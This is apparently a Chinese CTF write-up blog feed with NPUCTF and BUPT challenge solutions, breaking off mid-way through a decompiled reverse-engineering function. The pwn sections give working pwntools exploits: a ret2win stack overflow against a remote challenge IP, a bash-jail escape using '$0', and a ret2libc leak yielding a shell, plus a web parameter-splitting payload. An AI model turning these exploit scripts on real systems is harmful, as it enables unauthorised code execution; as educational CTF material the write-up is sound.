<p><img src="/2018/05/13/NPUCTF部分Writeup/16.jpg" alt="ida1"><br>得到密码为 1234npuuu<br><img src="/2018/05/13/NPUCTF部分Writeup/17.jpg" alt="ida1"><br>登录获得Flag : flag{W3lcOme_com3_to_ctf}</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn-checkin"><a href="#pwn-checkin" class="headerlink" title="pwn_checkin"></a>pwn_checkin</h2><p>载入ida分析<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-48h]</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"why not you input something?"</span>);</div><div class="line">  gets(&amp;s);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>漏洞存在于gets函数<br>继续分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int call_system()</div><div class="line">&#123;</div><div class="line">  return system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>题目中提供了shell所以 只需要溢出 修改ret到 call_system 地址即可</p>
<p>offset = rbp-48h -(rbp-0x4)</p>
<p>所以构造exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment">#p = process('./checkin')</span></div><div class="line">p = remote(<span class="string">'149.28.142.91'</span>,<span class="number">10000</span>)</div><div class="line">sys_addr = <span class="number">0x080484EB</span></div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x48</span> +<span class="string">'aaaa'</span>+p32(sys_addr)</div><div class="line"><span class="keyword">print</span> payload</div><div class="line"><span class="comment">#p.recv('why not you input something?')</span></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="baby-bashjail"><a href="#baby-bashjail" class="headerlink" title="baby_bashjail"></a>baby_bashjail</h2><p>载入ida分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  char s; // [rsp+0h] [rbp-20h]</div><div class="line">  unsigned __int64 v5; // [rsp+18h] [rbp-8h]</div><div class="line"></div><div class="line">  v5 = __readfsqword(0x28u);</div><div class="line">  setvbuf(stdin, 0LL, 2, 0LL);</div><div class="line">  setvbuf(stdout, 0LL, 2, 0LL);</div><div class="line">  puts(&quot;======baby jail======&quot;);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    putchar(62);</div><div class="line">    fgets(&amp;s, 20, stdin);</div><div class="line">    if ( (unsigned int)filter(&amp;s, 20LL) )</div><div class="line">      break;</div><div class="line">    system(&amp;s);</div><div class="line">  &#125;</div><div class="line">  putchar(62);</div><div class="line">  puts(&quot;No way! Little Hacker!&quot;);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>发现程序提供了system 但是 使用前使用filter进行参数的判断<br>查看 filter函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">_int64 __fastcall filter(const char *a1)</div><div class="line">&#123;</div><div class="line">  int i; // [rsp+18h] [rbp-8h]</div><div class="line">  int v3; // [rsp+1Ch] [rbp-4h]</div><div class="line"></div><div class="line">  v3 = strlen(a1);</div><div class="line">  for ( i = 0; i &lt; v3; ++i )</div><div class="line">  &#123;</div><div class="line">    switch ( a1[i] )</div><div class="line">    &#123;</div><div class="line">      case &apos;l&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;s&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;c&apos;:</div><div class="line">        return 1LL;</div><div class="line">    &#125;</div><div class="line">    switch ( a1[i] )</div><div class="line">    &#123;</div><div class="line">      case &apos;a&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;t&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;f&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;l&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;g&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;*&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;c&apos;:</div><div class="line">        return 1LL;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return deep_filter(a1);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>进行判断检查 不能存在这些关键字母 并传入depp_filter<br>查看deep_filter<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">signed __int64 __fastcall deep_filter(const char *a1)</div><div class="line">&#123;</div><div class="line">  int i; // [rsp+18h] [rbp-8h]</div><div class="line">  int v3; // [rsp+1Ch] [rbp-4h]</div><div class="line"></div><div class="line">  v3 = strlen(a1);</div><div class="line">  for ( i = 0; i &lt; v3; ++i )</div><div class="line">  &#123;</div><div class="line">    switch ( a1[i] )</div><div class="line">    &#123;</div><div class="line">      case &apos;b&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;d&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;e&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;h&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;i&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;j&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;k&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;m&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;n&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;o&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;p&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;q&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;r&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;s&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;u&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;v&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;w&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;x&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;y&apos;:</div><div class="line">        return 1LL;</div><div class="line">      case &apos;z&apos;:</div><div class="line">        return 1LL;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return 0LL;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>哇 这么狠 原来就是把所有字母都过滤的<br>但是题目需要利用system进行flag的获取<br>argv[0]相当于 sh<br>所以 只需要传入 $0 就可以获取一个shell</p>
<p>EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">'149.28.142.91'</span>,<span class="number">10002</span>)</div><div class="line">p.sendline(<span class="string">'$0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="Warrior-Tales"><a href="#Warrior-Tales" class="headerlink" title="Warrior_Tales"></a>Warrior_Tales</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec warrior_tales</div><div class="line">[*] <span class="string">'/home/ios/warrior_tales'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
<p>开启NX和RELRO</p>
<p>载入IDA分析 漏洞存在于vlun函数里<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">vlun</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+8h] [ebp-30h]</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Hero! Now, write something for your story!"</span>);</div><div class="line">  gets(&amp;s); <span class="comment">//漏洞利用点</span></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"What a wonderful ending!"</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>但是由于RELRO开启不能直接利用libc构造rop 必须leak出真实地址进而获得system_addr<br>之前由于偏移写错导致leak一直有问题0.0<br>通过构造循环来leak puts_addr<br>这里构造思路有两种<br>第一种<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</div><div class="line">puts_got = elf.got[<span class="string">'puts'</span>]</div><div class="line">vlun_addr = <span class="number">0x08048659</span></div><div class="line"></div><div class="line">payload1 = <span class="string">"A"</span>*<span class="number">52</span>+ p32(puts_plt) + p32(vlun_addr) + p32(puts_got)</div></pre></td></tr></table></figure></p>
<p>通过vlun函数循环进行leak</p>
<p>第二种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">puts_plt = elf.symbols[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">start_addr = 0x080484D0</div><div class="line">payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(start_addr) + p32(puts_got)</div></pre></td></tr></table></figure></p>
<p>通过循环程序进行leak</p>
<p>可以获得puts_addr<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Received 0x59 bytes:</div><div class="line">    00000000  57 68 61 74  20 61 20 77  6f 6e 64 65  72 66 75 6c  │What│ a w│onde│rful│</div><div class="line">    00000010  20 65 6e 64  69 6e 67 21  0a a0 1c d9  f7 40 a5 d4  │ end│ing!│····│·@··│</div><div class="line">    00000020  f7 60 23 d9  f7 20 39 d9  f7 c0 e0 d8  f7 0a 48 65  │·`<span class="comment">#·│· 9·│····│··He│</span></div><div class="line">    00000030  72 6f 21 20  4e 6f 77 2c  20 77 72 69  74 65 20 73  │ro! │Now,│ wri│te s│</div><div class="line">    00000040  6f 6d 65 74  68 69 6e 67  20 66 6f 72  20 79 6f 75  │omet│hing│ <span class="keyword">for</span>│ you│</div><div class="line">    00000050  72 20 73 74  6f 72 79 21  0a                        │r st│ory!│·│</div><div class="line">    00000059</div><div class="line">puts_addr= 0xf7d91ca0</div><div class="line">[*] system = 0xf7d6cda0</div></pre></td></tr></table></figure></p>
<p>由于服务器关闭 这里本地进行getshell</p>
<p>exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from struct import pack</div><div class="line"></div><div class="line">context.log_level = &apos;debug&apos; </div><div class="line">#libc = ELF(&apos;libc.so.6&apos;)</div><div class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</div><div class="line">elf = ELF(&apos;warrior_tales&apos;)</div><div class="line"></div><div class="line">p1 = process(&apos;./warrior_tales&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;&gt;&quot;))</div><div class="line">p1.sendline(&apos;ios&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;select your choice:&quot;))</div><div class="line">p1.sendline(&apos;2&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;select your choice:&quot;))</div><div class="line">p1.sendline(&apos;2&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;select your choice:&quot;))</div><div class="line">p1.sendline(&apos;2&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;select your choice:&quot;))</div><div class="line">p1.sendline(&apos;2&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;select your choice:&quot;))</div><div class="line">p1.sendline(&apos;2&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;select your choice:&quot;))</div><div class="line">p1.sendline(&apos;2&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;select your choice:&quot;))</div><div class="line">p1.sendline(&apos;1&apos;)</div><div class="line">log.info(p1.recvuntil(&quot;Hero! Now, write something for your story!&quot;))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">puts_plt = elf.symbols[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">vlun_addr = 0x08048659</div><div class="line">gdb.attach(p1,&apos;b *0x08048659&apos;)</div><div class="line">raw_input(&apos;Go!!!&apos;)</div><div class="line">payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(vlun_addr) + p32(puts_got)</div><div class="line">p1.sendline(payload1)</div><div class="line">p1.recvuntil(&apos;What a wonderful ending!\n&apos;)</div><div class="line">data=u32(p1.recv(4))</div><div class="line">puts_addr=data</div><div class="line">print &apos;puts_addr= &apos;+hex(puts_addr)</div><div class="line"></div><div class="line">system=libc.symbols[&apos;system&apos;]-libc.symbols[&apos;puts&apos;]+puts_addr</div><div class="line">log.info(&apos;system = &apos; + hex(system))</div><div class="line">binsh=next(libc.search(&apos;/bin/sh&apos;))-libc.symbols[&apos;puts&apos;]+puts_addr</div><div class="line"></div><div class="line">payload=&quot;A&quot;*52+p32(system)+p32(1)+p32(binsh)</div><div class="line">p1.sendline(payload)</div><div class="line"></div><div class="line">p1.interactive()</div></pre></td></tr></table></figure></p>
<p>运行结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ whoami</div><div class="line">[DEBUG] Sent 0x7 bytes:</div><div class="line">    <span class="string">'whoami\n'</span></div><div class="line">[DEBUG] Received 0x4 bytes:</div><div class="line">    <span class="string">'ios\n'</span></div><div class="line">ios</div><div class="line">$</div></pre></td></tr></table></figure></p>
<p>最后感谢下 kaka师傅指出我的错误(0~0) </p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2018/05/13/NPUCTF部分Writeup/1.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;/p&gt;
&lt;p&gt;查看源码&lt;br&gt;&lt;img src=&quot;/2018/05/13/NPUCTF部分Writeup/2.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;br&gt;得到Flag : flag{begin_to_npuctf}&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="NPUCTF" scheme="http://iosmosis.github.io/tags/NPUCTF/"/>
    
      <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>北邮网安杯Writeup</title>
    <link href="http://iosmosis.github.io/2018/04/03/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AFWriteup/"/>
    <id>http://iosmosis.github.io/2018/04/03/北邮网安杯Writeup/</id>
    <published>2018-04-02T16:44:19.000Z</published>
    <updated>2018-06-09T08:28:48.424Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="WEB1-交易中心，你能买到FLAG吗？"><a href="#WEB1-交易中心，你能买到FLAG吗？" class="headerlink" title="WEB1 交易中心，你能买到FLAG吗？"></a>WEB1 交易中心，你能买到FLAG吗？</h3><p>提供了源码下载<br><img src="/2018/04/03/北邮网安杯Writeup/3.jpg" alt="源码"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<p><img src="/2018/04/03/北邮网安杯Writeup/1.jpg" alt="网站入口"></p>
<ul>
<li><!-- more -->
<the rest="" of="" contents="" |="" 余下全文=""><br>分析源码<br><img src="/2018/04/03/北邮网安杯Writeup/2.jpg" alt="源码分析"></the></li>
</ul>
<p>POST三个参数 并且通过||进行拼接 这样最后的payment应该为goods||message||goods<br><img src="/2018/04/03/北邮网安杯Writeup/4.jpg" alt="源码分析2"></p>
<h4 id="了解到intval-函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。"><a href="#了解到intval-函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。" class="headerlink" title="了解到intval()函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。"></a>了解到intval()函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。</h4><p>而参数message可控 所以可以想出让intval转换停在message所传值后面利用既然是利用||分割进行转换 所以这里传值时打乱原有的||分割使payment再次被分割时出现非数字使之停止</p>
<p>构造 直接在POST写入<br>所以构造payload：goods=4&amp;message=40|(此处为当时测试所用值)&amp;goods=1000<br>所得之后的数据为4||40|||1000 分割后会导致第三数据的1000变为|1000<br>提交得到flag</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>运行程序了解程序流程<br><img src="/2018/04/03/北邮网安杯Writeup/5.jpg" alt="程序测试"></p>
<p>进行了长度判断<br>不是很会RE 发现没有定位到main入口 就IDA+OD分析<br>定位到相关汇编代码<br><img src="/2018/04/03/北邮网安杯Writeup/6.jpg" alt="IDA1"></p>
<p>进行判断长度需要大于0Ah小于23h<br><img src="/2018/04/03/北邮网安杯Writeup/7.jpg" alt="IDA2"><br>shift+F12 字符串搜索<br><img src="/2018/04/03/北邮网安杯Writeup/16.jpg" alt="IDA2"><br>定位到data<br><img src="/2018/04/03/北邮网安杯Writeup/17.jpg" alt="IDA2"><br>双击<br>DATA XREF 找到原引用位置<br><img src="/2018/04/03/北邮网安杯Writeup/18.jpg" alt="IDA2"><br><img src="/2018/04/03/北邮网安杯Writeup/19.jpg" alt="IDA2"><br>通过快捷键P create一个函数 得到主体函数<br>然后再通过F5转为C<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line">unsigned int __thiscall sub_401490(CWnd *this)</div><div class="line">&#123;</div><div class="line">  CWnd *v1; // esi</div><div class="line">  unsigned int result; // eax</div><div class="line">  signed int v3; // eax</div><div class="line">  int v4; // eax</div><div class="line">  char v5; // [esp+Ch] [ebp-80h]</div><div class="line">  char v6; // [esp+Dh] [ebp-7Fh]</div><div class="line">  char v7; // [esp+Eh] [ebp-7Eh]</div><div class="line">  char v8; // [esp+Fh] [ebp-7Dh]</div><div class="line">  char v9; // [esp+10h] [ebp-7Ch]</div><div class="line">  char v10; // [esp+11h] [ebp-7Bh]</div><div class="line">  char v11; // [esp+12h] [ebp-7Ah]</div><div class="line">  char v12; // [esp+13h] [ebp-79h]</div><div class="line">  char v13; // [esp+14h] [ebp-78h]</div><div class="line">  char v14; // [esp+15h] [ebp-77h]</div><div class="line">  char v15; // [esp+16h] [ebp-76h]</div><div class="line">  char v16; // [esp+17h] [ebp-75h]</div><div class="line">  char v17; // [esp+18h] [ebp-74h]</div><div class="line">  char v18; // [esp+19h] [ebp-73h]</div><div class="line">  char v19; // [esp+1Ah] [ebp-72h]</div><div class="line">  char v20; // [esp+1Bh] [ebp-71h]</div><div class="line">  char v21; // [esp+1Ch] [ebp-70h]</div><div class="line">  char v22; // [esp+1Dh] [ebp-6Fh]</div><div class="line">  char v23; // [esp+1Eh] [ebp-6Eh]</div><div class="line">  char v24; // [esp+1Fh] [ebp-6Dh]</div><div class="line">  char v25; // [esp+20h] [ebp-6Ch]</div><div class="line">  char v26; // [esp+21h] [ebp-6Bh]</div><div class="line">  char v27; // [esp+22h] [ebp-6Ah]</div><div class="line">  char v28; // [esp+23h] [ebp-69h]</div><div class="line">  char v29; // [esp+24h] [ebp-68h]</div><div class="line">  char v30; // [esp+25h] [ebp-67h]</div><div class="line">  char v31; // [esp+26h] [ebp-66h]</div><div class="line">  char v32; // [esp+27h] [ebp-65h]</div><div class="line">  char v33; // [esp+28h] [ebp-64h]</div><div class="line">  char v34; // [esp+29h] [ebp-63h]</div><div class="line">  char v35; // [esp+2Ah] [ebp-62h]</div><div class="line">  char v36; // [esp+2Bh] [ebp-61h]</div><div class="line">  char v37; // [esp+2Ch] [ebp-60h]</div><div class="line">  char v38[27]; // [esp+2Dh] [ebp-5Fh]</div><div class="line">  char v39; // [esp+48h] [ebp-44h]</div><div class="line">  __int16 v40; // [esp+89h] [ebp-3h]</div><div class="line">  char v41; // [esp+8Bh] [ebp-1h]</div><div class="line"></div><div class="line">  v1 = this;</div><div class="line">  v33 = 0;</div><div class="line">  memset(&amp;v34, 0, 0x60u);</div><div class="line">  v40 = 0;</div><div class="line">  v41 = 0;</div><div class="line">  v11 = 67;</div><div class="line">  v19 = 67;</div><div class="line">  v22 = 67;</div><div class="line">  v8 = 82;</div><div class="line">  v15 = 82;</div><div class="line">  v29 = 1;</div><div class="line">  v30 = 1;</div><div class="line">  v31 = 1;</div><div class="line">  v5 = 119;</div><div class="line">  v6 = 17;</div><div class="line">  v7 = 77;</div><div class="line">  v9 = 110;</div><div class="line">  v10 = 23;</div><div class="line">  v12 = 103;</div><div class="line">  v13 = 18;</div><div class="line">  v14 = 77;</div><div class="line">  v16 = 97;</div><div class="line">  v17 = 80;</div><div class="line">  v18 = 69;</div><div class="line">  v20 = 73;</div><div class="line">  v21 = 87;</div><div class="line">  v23 = 119;</div><div class="line">  v24 = 83;</div><div class="line">  v25 = 101;</div><div class="line">  v26 = 65;</div><div class="line">  v27 = 87;</div><div class="line">  v28 = 121;</div><div class="line">  v32 = 0;</div><div class="line">  result = CWnd::GetDlgItemTextA(this, 1000, &amp;v33, 100);</div><div class="line">  if ( result &gt; 0x23 || result &lt; 0xA )</div><div class="line">    result = CWnd::MessageBoxA(v1, aTheLengthOfStr, aHint, 0);</div><div class="line">  if ( v33 == 66 &amp;&amp; v34 == 85 &amp;&amp; v36 == 84 &amp;&amp; v35 == 80 &amp;&amp; v37 == 123 &amp;&amp; v39 == 125 )</div><div class="line">  &#123;</div><div class="line">    v3 = 5;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      *(&amp;v33 + v3) = (*(&amp;v33 + v3) + 1) ^ 0x23;</div><div class="line">      ++v3;</div><div class="line">    &#125;</div><div class="line">    while ( v3 &lt; 32 );</div><div class="line">    v4 = 0;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      v38[v4];</div><div class="line">      *(&amp;v5 + v4++);</div><div class="line">    &#125;</div><div class="line">    while ( v4 + 5 &lt; 32 );</div><div class="line">    result = CWnd::MessageBoxA(v1, aCongratulation, aSuccess, 0);</div><div class="line">  &#125;</div><div class="line">  return result;</div><div 